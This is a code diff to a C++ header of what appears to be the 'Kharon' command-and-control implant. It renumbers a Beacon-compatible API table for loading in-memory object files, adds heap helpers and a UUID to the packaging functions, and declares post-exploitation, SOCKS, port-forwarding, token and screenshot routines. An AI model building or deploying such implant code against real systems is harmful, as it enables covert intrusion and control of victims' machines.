@@ -95,6 +95,7 @@ typedef struct {
     struct {
         WCHAR* Spawnto;
         CHAR*  ForkPipe;
+        PCHAR  CurrentUUID;
     } Postex;
 
     struct {
@@ -1049,7 +1050,7 @@ public:
     struct {
         UPTR  Hash;
         PVOID Ptr;
-    } ApiTable[38] = {
+    } ApiTable[40] = {
         ApiTable[0]  = { Hsh::Str("BeaconDataParse"),   reinterpret_cast<PVOID>(&Coff::DataParse) },
         ApiTable[1]  = { Hsh::Str("BeaconDataInt"),     reinterpret_cast<PVOID>(&Coff::DataInt) },
         ApiTable[2]  = { Hsh::Str("BeaconDataExtract"), reinterpret_cast<PVOID>(&Coff::DataExtract) },
@@ -1067,12 +1068,12 @@ public:
         ApiTable[12] = { Hsh::Str("BeaconVirtualProtect"),   reinterpret_cast<PVOID>(&Coff::VirtualProtect) },
         ApiTable[13] = { Hsh::Str("BeaconVirtualAllocEx"),   reinterpret_cast<PVOID>(&Coff::VirtualAllocEx) },
         ApiTable[14] = { Hsh::Str("BeaconVirtualProtectEx"), reinterpret_cast<PVOID>(&Coff::VirtualProtectEx) },
-        ApiTable[18] = { Hsh::Str("BeaconOpenProcess"),      reinterpret_cast<PVOID>(&Coff::OpenProcess) },
-        ApiTable[19] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },
+        ApiTable[15] = { Hsh::Str("BeaconOpenProcess"),      reinterpret_cast<PVOID>(&Coff::OpenProcess) },
+        ApiTable[16] = { Hsh::Str("BeaconOpenThread"),       reinterpret_cast<PVOID>(&Coff::OpenThread) },
 
-        ApiTable[15] = { Hsh::Str("BeaconIsAdmin"),        reinterpret_cast<PVOID>(&Coff::IsAdmin) },
-        ApiTable[16] = { Hsh::Str("BeaconUseToken"),       reinterpret_cast<PVOID>(&Coff::UseToken) },
-        ApiTable[17] = { Hsh::Str("BeaconRevertToken"),    reinterpret_cast<PVOID>(&Coff::RevertToken) },
+        ApiTable[17] = { Hsh::Str("BeaconIsAdmin"),        reinterpret_cast<PVOID>(&Coff::IsAdmin) },
+        ApiTable[18] = { Hsh::Str("BeaconUseToken"),       reinterpret_cast<PVOID>(&Coff::UseToken) },
+        ApiTable[19] = { Hsh::Str("BeaconRevertToken"),    reinterpret_cast<PVOID>(&Coff::RevertToken) },
 
         ApiTable[20] = { Hsh::Str("BeaconFormatAlloc"),    reinterpret_cast<PVOID>(&Coff::FmtAlloc) },
         ApiTable[21] = { Hsh::Str("BeaconFormatAppend"),   reinterpret_cast<PVOID>(&Coff::FmtAppend) },
@@ -1082,16 +1083,21 @@ public:
         ApiTable[25] = { Hsh::Str("BeaconFormatReset"),    reinterpret_cast<PVOID>(&Coff::FmtReset) },
         ApiTable[26] = { Hsh::Str("BeaconFormatToString"), reinterpret_cast<PVOID>(&Coff::FmtToString) },
 
-        ApiTable[29] = { Hsh::Str("BeaconPkgBytes"),   reinterpret_cast<PVOID>(&Coff::PkgBytes) },
-        ApiTable[30] = { Hsh::Str("BeaconPkgInt8"),    reinterpret_cast<PVOID>(&Coff::PkgInt8) },
-        ApiTable[31] = { Hsh::Str("BeaconPkgInt16"),   reinterpret_cast<PVOID>(&Coff::PkgInt16) },
-        ApiTable[32] = { Hsh::Str("BeaconPkgInt32"),   reinterpret_cast<PVOID>(&Coff::PkgInt32) },
-        ApiTable[33] = { Hsh::Str("BeaconPkgInt64"),   reinterpret_cast<PVOID>(&Coff::PkgInt64) },
+        ApiTable[27] = { Hsh::Str("BeaconHeapAlloc"),       reinterpret_cast<PVOID>(&Coff::HeapAlloc) },
+        ApiTable[28] = { Hsh::Str("BeaconHeapReAlloc"),     reinterpret_cast<PVOID>(&Coff::HeapReAlloc) },
+        ApiTable[29] = { Hsh::Str("BeaconHeapFree"),        reinterpret_cast<PVOID>(&Coff::HeapFree) },
+        ApiTable[30] = { Hsh::Str("BeaconHeapCheckPtr"),    reinterpret_cast<PVOID>(&Coff::HeapCheckPtr) },
 
-        ApiTable[34] = { Hsh::Str("BeaconGetSpawnTo"),  reinterpret_cast<PVOID>(&Coff::GetSpawn) },
-        ApiTable[35] = { Hsh::Str("BeaconInformation"), reinterpret_cast<PVOID>(&Coff::Information) },
-            ApiTable[36] = { Hsh::Str("AxDownloadMemory"), reinterpret_cast<PVOID>(&Coff::AxDownloadMemory) },
-        ApiTable[37] = { Hsh::Str("AxAddScreenshot"), reinterpret_cast<PVOID>(&Coff::AxAddScreenshot) },
+        ApiTable[31] = { Hsh::Str("BeaconPkgBytes"),   reinterpret_cast<PVOID>(&Coff::PkgBytes) },
+        ApiTable[32] = { Hsh::Str("BeaconPkgInt8"),    reinterpret_cast<PVOID>(&Coff::PkgInt8) },
+        ApiTable[33] = { Hsh::Str("BeaconPkgInt16"),   reinterpret_cast<PVOID>(&Coff::PkgInt16) },
+        ApiTable[34] = { Hsh::Str("BeaconPkgInt32"),   reinterpret_cast<PVOID>(&Coff::PkgInt32) },
+        ApiTable[35] = { Hsh::Str("BeaconPkgInt64"),   reinterpret_cast<PVOID>(&Coff::PkgInt64) },
+
+        ApiTable[36] = { Hsh::Str("BeaconGetSpawnTo"),  reinterpret_cast<PVOID>(&Coff::GetSpawn) },
+        ApiTable[37] = { Hsh::Str("BeaconInformation"), reinterpret_cast<PVOID>(&Coff::Information) },
+        ApiTable[38] = { Hsh::Str("AxDownloadMemory"),  reinterpret_cast<PVOID>(&Coff::AxDownloadMemory) },
+        ApiTable[39] = { Hsh::Str("AxAddScreenshot"),   reinterpret_cast<PVOID>(&Coff::AxAddScreenshot) },
     };
 
     auto Add( PVOID MmBegin, PVOID MmEnd, PVOID Entry ) -> BOF_OBJ*;
@@ -1115,6 +1121,11 @@ public:
     auto Unmap( _In_ COFF_MAPPED* Mapped ) -> BOOL;
     auto Obfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;
     auto Deobfuscate( _In_ COFF_MAPPED* Mapped ) -> BOOL;
+
+    static auto DECLFN HeapAlloc( _In_ ULONG size ) -> PVOID;
+    static auto DECLFN HeapReAlloc( _In_ PVOID block, _In_ ULONG size ) -> PVOID;
+    static auto DECLFN HeapFree( _In_ PVOID block ) -> BOOL;
+    static auto DECLFN HeapCheckPtr( _In_ PVOID block ) -> BOOL;
 
     static auto DataExtract( DATAP* parser, PINT size ) -> PCHAR;
     static auto DataInt( DATAP* parser ) -> INT;
@@ -1160,11 +1171,11 @@ public:
 
     static auto PkgCreate( _Out_ PACKAGE* Package ) -> VOID;
     static auto PkgDestroy( _In_ PACKAGE* Package ) -> VOID;
-    static auto PkgInt8( _In_ BYTE Data ) -> VOID;
-    static auto PkgInt16( _In_ INT16 Data ) -> VOID;
-    static auto PkgInt32( _In_ INT32 Data ) -> VOID;
-    static auto PkgInt64( _In_ INT32 Data ) -> VOID;
-    static auto PkgBytes( _In_ PBYTE Buffer, _In_ ULONG Length ) -> VOID;
+    static auto PkgInt8( _In_ BYTE Data, _In_ PCHAR UUID ) -> VOID;
+    static auto PkgInt16( _In_ INT16 Data, _In_ PCHAR UUID ) -> VOID;
+    static auto PkgInt32( _In_ INT32 Data, _In_ PCHAR UUID ) -> VOID;
+    static auto PkgInt64( _In_ INT32 Data, _In_ PCHAR UUID ) -> VOID;
+    static auto PkgBytes( _In_ PBYTE Buffer, _In_ ULONG Length, _In_ PCHAR UUID ) -> VOID;
 
     static auto AddValue( _In_ PCCH key, _In_ PVOID ptr ) -> BOOL;
     static auto GetValue( _In_ PCCH key ) -> PVOID;
@@ -1285,9 +1296,6 @@ public:
 
     PACKAGE* Shared = nullptr;
 
-    TRANSPORT_NODE* QueueHead  = nullptr;
-    ULONG           QueueCount = 0;
-
     auto Enqueue( _In_ PVOID Buffer, _In_ ULONG Length ) -> VOID;
     auto FlushQueue( VOID ) -> VOID;
 
@@ -1343,21 +1351,11 @@ public:
     auto Wstr( _In_ PPARSER parser, _In_ ULONG* size ) -> PWCHAR;
 };
 
-struct _TRANSPORT_NODE {
-    PVOID Buffer;
-    ULONG Length;
-
-    struct _TRANSPORT_NODE* Next;
-};
-typedef _TRANSPORT_NODE TRANSPORT_NODE;
-
 class Transport {    
 private:
     Root::Kharon* Self;
 public:
     Transport( Root::Kharon* KharonRf ) : Self( KharonRf ) {};
-
-    TRANSPORT_NODE* Node;
 
     struct {
         CHAR*  FileID;
@@ -1518,6 +1516,7 @@ public:
 
     auto Socks( _In_ JOBS* Job ) -> ERROR_CODE;
     auto ProcessTunnel( _In_ JOBS* Job ) -> ERROR_CODE;
+    auto ProcessPostex( _In_ JOBS* Job ) -> ERROR_CODE;
     auto ProcessDownloads( _In_ JOBS* Job ) -> ERROR_CODE;
     auto RPortfwd( _In_ JOBS* Job ) -> ERROR_CODE;
 
